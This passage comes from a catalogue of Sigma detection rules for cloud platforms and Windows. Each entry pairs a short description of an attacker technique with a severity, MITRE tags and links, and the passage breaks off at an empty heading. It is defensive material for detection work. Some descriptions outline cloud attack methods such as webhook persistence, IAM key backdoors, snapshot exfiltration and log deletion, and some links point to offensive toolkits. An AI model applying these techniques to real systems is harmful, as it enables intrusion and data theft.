* https://cloud.google.com/dns/docs/reference/v1/managedZones

    
### Google Full Network Traffic Packet Capture
    
    Identifies potential full network packet capture in gcp. This feature can potentially be abused to read sensitive data from unencrypted internal traffic.

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1074
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_full_network_traffic_packet_capture.yml
* https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging

* https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/com/google/api/services/compute/Compute.PacketMirrorings.html

    
### Google Cloud Storage Buckets Modified or Deleted
    
    Detects when storage bucket is modified or deleted in Google Cloud.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_bucket_modified_or_deleted.yml
* https://cloud.google.com/storage/docs/json_api/v1/buckets

    
### Google Cloud Kubernetes Admission Controller
    
    Identifies when an admission controller is executed in GCP Kubernetes. A Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server. The behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster. An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster. For example, attackers can intercept and modify the pod creation operations in the cluster and add their malicious container to every created pod. An adversary can use the webhook ValidatingAdmissionWebhook, which could be used to obtain access credentials. An adversary could use the webhook to intercept the requests to the API server, record secrets, and other sensitive information.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1078
    * MITRE: attack.credential_access
    * MITRE: attack.t1552
    * MITRE: attack.t1552.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_kubernetes_admission_controller.yml
* https://cloud.google.com/kubernetes-engine/docs

    
### Google Cloud SQL Database Modified or Deleted
    
    Detect when a Cloud SQL DB has been modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_sql_database_modified_or_deleted.yml
* https://cloud.google.com/sql/docs/mysql/admin-api/rest/v1beta4/users/update

    
### Google Cloud Kubernetes Secrets Modified or Deleted
    
    Identifies when the Secrets are Modified or Deleted.

    * Level: medium
    * MITRE: attack.credential_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_kubernetes_secrets_modified_or_deleted.yml
* https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging

    
### Google Cloud Kubernetes CronJob
    
    Identifies when a Google Cloud Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_kubernetes_cronjob.yml
* https://cloud.google.com/kubernetes-engine/docs

* https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/

* https://kubernetes.io/docs/concepts/workloads/controllers/job/

    
### Google Cloud Kubernetes RoleBinding
    
    Detects the creation or patching of potential malicious RoleBinding. This includes RoleBindings and ClusterRoleBinding.

    * Level: medium
    * MITRE: attack.credential_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_kubernetes_rolebinding.yml
* https://github.com/elastic/detection-rules/pull/1267

* https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/cluster-role-v1/#ClusterRole

* https://cloud.google.com/kubernetes-engine/docs/how-to/role-based-access-control

* https://kubernetes.io/docs/reference/access-authn-authz/rbac/

* https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging

    
### Google Cloud Service Account Disabled or Deleted
    
    Identifies when a service account is disabled or deleted in Google Cloud.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1531
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_service_account_disabled_or_deleted.yml
* https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts

    
### Google Cloud Service Account Modified
    
    Identifies when a service account is modified in Google Cloud.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_service_account_modified.yml
* https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts

    
### Google Cloud Storage Buckets Enumeration
    
    Detects when storage bucket is enumerated in Google Cloud.

    * Level: low
    * MITRE: attack.discovery
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_bucket_enumeration.yml
* https://cloud.google.com/storage/docs/json_api/v1/buckets

    
### Google Cloud VPN Tunnel Modified or Deleted
    
    Identifies when a VPN Tunnel Modified or Deleted in Google Cloud.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_vpn_tunnel_modified_or_deleted.yml
* https://any-api.com/googleapis_com/compute/docs/vpnTunnels

    
### AWS Config Disabling Channel/Recorder
    
    Detects AWS Config Service disabling

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_config_disable_recording.yml
    
### AWS IAM Backdoor Users Keys
    
    Detects AWS API key creation for a user by another user. Backdoored users can be used to obtain persistence in the AWS environment. Also with this alert, you can detect a flow of AWS keys in your org.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_iam_backdoor_users_keys.yml
* https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__backdoor_users_keys/main.py

    
### AWS STS GetSessionToken Misuse
    
    Identifies the suspicious use of GetSessionToken. Tokens could be created and used by attackers to move laterally and escalate privileges.

    * Level: low
    * MITRE: attack.lateral_movement
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548
    * MITRE: attack.t1550
    * MITRE: attack.t1550.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_sts_getsessiontoken_misuse.yml
* https://github.com/elastic/detection-rules/pull/1213

* https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html

    
### AWS EC2 Disable EBS Encryption
    
    Identifies disabling of default Amazon Elastic Block Store (EBS) encryption in the current region. Disabling default encryption does not change the encryption status of your existing volumes.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1486
    * MITRE: attack.t1565
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_ec2_disable_encryption.yml
* https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DisableEbsEncryptionByDefault.html

    
### AWS STS AssumeRole Misuse
    
    Identifies the suspicious use of AssumeRole. Attackers could move laterally and escalate privileges.

    * Level: low
    * MITRE: attack.lateral_movement
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548
    * MITRE: attack.t1550
    * MITRE: attack.t1550.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_sts_assumerole_misuse.yml
* https://github.com/elastic/detection-rules/pull/1214

* https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html

    
### AWS SecurityHub Findings Evasion
    
    Detects the modification of the findings on SecurityHub.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_securityhub_finding_evasion.yml
* https://docs.aws.amazon.com/cli/latest/reference/securityhub/

    
### Restore Public AWS RDS Instance
    
    Detects the recovery of a new public database instance from a snapshot. It may be a part of data exfiltration.

    * Level: high
    * MITRE: attack.exfiltration
    * MITRE: attack.t1020
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_rds_public_db_restore.yml
* https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/rds__explore_snapshots/main.py

    
### AWS EC2 Download Userdata
    
    Detects bulk downloading of User Data associated with AWS EC2 instances. Instance User Data may include installation scripts and hard-coded secrets for deployment.

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1020
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_ec2_download_userdata.yml
* https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/ec2__download_userdata/main.py

    
### AWS Route 53 Domain Transfer Lock Disabled
    
    Detects when a transfer lock was removed from a Route 53 domain. It is recommended to refrain from performing this action unless intending to transfer the domain to a different registrar.

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.credential_access
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_route_53_domain_transferred_lock_disabled.yml
* https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/persistence_route_53_domain_transfer_lock_disabled.toml

* https://docs.aws.amazon.com/Route53/latest/APIReference/API_Operations_Amazon_Route_53.html

* https://docs.aws.amazon.com/Route53/latest/APIReference/API_domains_DisableDomainTransferLock.html

    
### AWS EC2 Startup Shell Script Change
    
    Detects changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM every time the specific instances are booted up.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.t1059.003
    * MITRE: attack.t1059.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_ec2_startup_script_change.yml
* https://github.com/RhinoSecurityLabs/pacu/blob/master/modules/ec2__startup_shell_script/main.py#L9

    
### AWS EKS Cluster Created or Deleted
    
    Identifies when an EKS cluster is created or deleted.

    * Level: low
    * MITRE: attack.impact
    * MITRE: attack.t1485
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_eks_cluster_created_or_deleted.yml
* https://any-api.com/amazonaws_com/eks/docs/API_Description

    
### AWS Suspicious SAML Activity
    
    Identifies when suspicious SAML activity has occurred in AWS. An adversary could gain backdoor access via SAML.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1078
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1548
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1550
    * MITRE: attack.t1550.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_susp_saml_activity.yml
* https://docs.aws.amazon.com/IAM/latest/APIReference/API_UpdateSAMLProvider.html

* https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithSAML.html

    
### AWS Macie Evasion
    
    Detects evade to Macie detection.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_macic_evasion.yml
* https://docs.aws.amazon.com/cli/latest/reference/macie/

    
### AWS Lambda Function Created or Invoked
    
    Detects when an user creates or invokes a lambda function.

    * Level: low
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_lambda_function_created_or_invoked.yml
* https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/

    
### AWS Route 53 Domain Transferred to Another Account
    
    Detects when a request has been made to transfer a Route 53 domain to another AWS account.

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.credential_access
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_route_53_domain_transferred_to_another_account.yml
* https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/persistence_route_53_domain_transferred_to_another_account.toml

    
### AWS Glue Development Endpoint Activity
    
    Detects possible suspicious glue development endpoint activity.

    * Level: low
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_passed_role_to_glue_development_endpoint.yml
* https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/

* https://docs.aws.amazon.com/glue/latest/webapi/API_CreateDevEndpoint.html

    
### AWS RDS Master Password Change
    
    Detects the change of database master password. It may be a part of data exfiltration.

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1020
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_rds_change_master_password.yml
* https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/rds__explore_snapshots/main.py

    
### AWS GuardDuty Important Change
    
    Detects updates of the GuardDuty list of trusted IPs, perhaps to disable security alerts against malicious IPs.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_guardduty_disruption.yml
* https://github.com/RhinoSecurityLabs/pacu/blob/master/modules/guardduty__whitelist_ip/main.py#L9

    
### AWS EC2 VM Export Failure
    
    An attempt to export an AWS EC2 instance has been detected. A VM Export might indicate an attempt to extract information from an instance.

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.t1005
    * MITRE: attack.exfiltration
    * MITRE: attack.t1537
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_ec2_vm_export_failure.yml
* https://docs.aws.amazon.com/vm-import/latest/userguide/vmexport.html#export-instance

    
### AWS CloudTrail Important Change
    
    Detects disabling, deleting and updating of a Trail

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_cloudtrail_disable_logging.yml
* https://docs.aws.amazon.com/awscloudtrail/latest/userguide/best-practices-security.html

    
### AWS Attached Malicious Lambda Layer
    
    Detects when an user attached a Lambda layer to an existing function to override a library that is in use by the function, where their malicious code could utilize the function's IAM role for AWS API calls. This would give an adversary access to the privileges associated with the Lambda service role that is attached to that function.

    * Level: medium
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_attached_malicious_lambda_layer.yml
* https://docs.aws.amazon.com/lambda/latest/dg/API_UpdateFunctionConfiguration.html

    
### AWS Snapshot Backup Exfiltration
    
    Detects the modification of an EC2 snapshot's permissions to enable access from another account

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1537
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_snapshot_backup_exfiltration.yml
* https://www.justice.gov/file/1080281/download

* https://attack.mitre.org/techniques/T1537/

    
### AWS Root Credentials
    
    Detects AWS root account usage

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1078.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_root_account_usage.yml
* https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html

    
### AWS EFS Fileshare Mount Modified or Deleted
    
    Detects when a EFS Fileshare Mount is modified or deleted. An adversary breaking any file system using the mount target that is being deleted, which might disrupt instances or applications using those mounts.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1485
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_efs_fileshare_mount_modified_or_deleted.yml
* https://docs.aws.amazon.com/efs/latest/ug/API_DeleteMountTarget.html

    
### AWS ElastiCache Security Group Modified or Deleted
    
    Identifies when an ElastiCache security group has been modified or deleted.

    * Level: low
    * MITRE: attack.impact
    * MITRE: attack.t1531
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_elasticache_security_group_modified_or_deleted.yml
* https://github.com/elastic/detection-rules/blob/7d5efd68603f42be5e125b5a6a503b2ef3ac0f4e/rules/integrations/aws/impact_elasticache_security_group_modified_or_deleted.toml

    
### AWS ElastiCache Security Group Created
    
    Detects when an ElastiCache security group has been created.

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.t1136
    * MITRE: attack.t1136.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_elasticache_security_group_created.yml
* https://github.com/elastic/detection-rules/blob/598f3d7e0a63221c0703ad9a0ea7e22e7bc5961e/rules/integrations/aws/persistence_elasticache_security_group_creation.toml

    
### AWS S3 Data Management Tampering
    
    Detects when a user tampers with S3 data management in Amazon Web Services.

    * Level: low
    * MITRE: attack.exfiltration
    * MITRE: attack.t1537
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_s3_data_management_tampering.yml
* https://github.com/elastic/detection-rules/pull/1145/files

* https://docs.aws.amazon.com/AmazonS3/latest/API/API_Operations.html

* https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketLogging.html

* https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketWebsite.html

* https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketEncryption.html

* https://docs.aws.amazon.com/AmazonS3/latest/userguide/setting-repl-config-perm-overview.html

* https://docs.aws.amazon.com/AmazonS3/latest/API/API_RestoreObject.html

    
### Account Enumeration on AWS
    
    Detects enumeration of accounts configuration via api call to list different instances and services within a short period of time.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1592
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_enum_listing.yml
    
### AWS User Login Profile Was Modified
    
    An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.
With this alert, it is used to detect anyone is changing password on behalf of other users.


    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_update_login_profile.yml
* https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation

    
### AWS EFS Fileshare Modified or Deleted
    
    Detects when a EFS Fileshare is modified or deleted. You can't delete a file system that is in use. If the file system has any mount targets, the adversary must first delete them, so deletion of a mount will occur before deletion of a fileshare.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/aws/aws_efs_fileshare_modified_or_deleted.yml
* https://docs.aws.amazon.com/efs/latest/ug/API_DeleteFileSystem.html

    
### Google Workspace MFA Disabled
    
    Detects when multi-factor authentication (MFA) is disabled.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gworkspace/gworkspace_mfa_disabled.yml
* https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3

* https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-security-settings#ENFORCE_STRONG_AUTHENTICATION

* https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-security-settings?hl=en#ALLOW_STRONG_AUTHENTICATION

    
### Google Workspace User Granted Admin Privileges
    
    Detects when an Google Workspace user is granted admin privileges.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gworkspace/gworkspace_user_granted_admin_privileges.yml
* https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3

* https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-user-settings#GRANT_ADMIN_PRIVILEGE

    
### Google Workspace Role Privilege Deleted
    
    Detects when an a role privilege is deleted in Google Workspace.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gworkspace/gworkspace_role_privilege_deleted.yml
* https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3

* https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-delegated-admin-settings

    
### Google Workspace Application Removed
    
    Detects when an an application is removed from Google Workspace.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gworkspace/gworkspace_application_removed.yml
* https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3

* https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings?hl=en#REMOVE_APPLICATION

* https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings?hl=en#REMOVE_APPLICATION_FROM_WHITELIST

    
### Google Workspace Granted Domain API Access
    
    Detects when an API access service account is granted domain authority.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gworkspace/gworkspace_granted_domain_api_access.yml
* https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3

* https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings#AUTHORIZE_API_CLIENT_ACCESS

    
### Google Workspace Role Modified or Deleted
    
    Detects when an a role is modified or deleted in Google Workspace.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gworkspace/gworkspace_role_modified_or_deleted.yml
* https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3

* https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-delegated-admin-settings

    
### OneLogin User Assumed Another User
    
    Detects when an user assumed another user account.

    * Level: low
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/onelogin/onelogin_assumed_another_user.yml
* https://developers.onelogin.com/api-docs/1/events/event-resource

    
### OneLogin User Account Locked
    
    Detects when an user acount is locked or suspended.

    * Level: low
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/onelogin/onelogin_user_account_locked.yml
* https://developers.onelogin.com/api-docs/1/events/event-resource/

    
### Raw Disk Access Using Illegitimate Tools
    
    Raw disk access using illegitimate tools, possible defence evasion

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/raw_access_thread/sysmon_raw_disk_access_using_illegitimate_tools.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### Delete Log from Application
    
    Deletion of log files is a known anti-forensic technique

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_delete/file_delete_win_delete_appli_log.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md

    
### Deletes Backup Files
    
    Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_delete/file_delete_win_delete_backup_file.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-6---windows---delete-backup-files

    
### Windows Spooler Service Suspicious File Deletion
    
    Detect DLL deletions from Spooler Service driver folder

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1574
    * MITRE: cve.2021.1675
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_delete/file_delete_win_cve_2021_1675_printspooler_del.yml
* https://github.com/hhlxf/PrintNightmare

* https://github.com/cube0x0/CVE-2021-1675

    
### Sysinternals SDelete File Deletion
    
    A General detection to trigger for the deletion of files by Sysinternals SDelete. It looks for the common name pattern used to rename files.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_delete/file_delete_win_sysinternals_sdelete_file_deletion.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/9

* https://threathunterplaybook.com/evals/apt29/detections/4.B.4_83D62033-105A-4A02-8B75-DAB52D8D51EC.html

    
### Prefetch File Deletion
    
    Detects the deletion of a prefetch file (AntiForensic)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_delete/file_delete_win_delete_prefetch.yml
    
### Suspicious Scripting in a WMI Consumer
    
    Detects suspicious scripting in WMI Event Consumers

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/wmi_event/sysmon_wmi_susp_scripting.yml
* https://in.security/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/

* https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar#L19

* https://github.com/RiccardoAncarani/LiquidSnake

    
### Suspicious Encoded Scripts in a WMI Consumer
    
    Detects suspicious encoded payloads in WMI Event Consumers

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1047
    * MITRE: attack.persistence
    * MITRE: attack.t1546.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/wmi_event/sysmon_wmi_susp_encoded_scripts.yml
* https://github.com/RiccardoAncarani/LiquidSnake

    
### WMI Event Subscription
    
    Detects creation of WMI event subscription persistence method

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1546.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/wmi_event/sysmon_wmi_event_subscription.yml
    
### Possible DNS Rebinding
    
    Detects several different DNS-answers by one domain with IPs from internal and external networks. Normally, DNS-answer contain TTL >100. (DNS-record will saved in host cache for a while TTL).

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1189
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_possible_dns_rebinding.yml
* https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325

    
### AppInstaller Attempts From URL by DNS
    
    AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_lobas_appinstaller.yml
* https://twitter.com/notwhickey/status/1333900137232523264

* https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/

    
### Suspicious DNS Query for IP Lookup Service APIs
    
    Detects DNS queries for ip lookup services such as api.ipify.org not originating from a browser process.

    * Level: medium
    * MITRE: attack.reconnaissance
    * MITRE: attack.t1590
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_susp_ipify.yml
* https://www.binarydefense.com/analysis-of-hancitor-when-boring-begets-beacon

* https://twitter.com/neonprimetime/status/1436376497980428318

    
### Suspicious TeamViewer Domain Access
    
    Detects DNS queries to a TeamViewer domain only resolved by a TeamViewer client by an image that isn't named TeamViewer (sometimes used by threat actors for obfuscation)

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_susp_teamviewer.yml
* https://www.teamviewer.com/en-us/

    
### Query to Ammyy Remote Access Software Domain
    
    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_ammyy.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-6---ammyy-admin-software-execution

    
### DNS Query for MEGA.io Upload Domain
    
    Detects DNS queries for subdomains used for upload to MEGA.io

    * Level: high
    * MITRE: attack.exfiltration
    * MITRE: attack.t1567.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_mega_nz.yml
* https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/

    
### Regsvr32 Network Activity
    
    Detects network connections and DNS queries initiated by Regsvr32.exe

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1559.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_regsvr32_network_activity.yml
* https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/

* https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md

    
### Query to LogMeIn Remote Access Software Domain
    
    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_logmein.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-3---logmein-files-detected-test-on-windows

    
### Query to GoToAssist Remote Access Software Domain
    
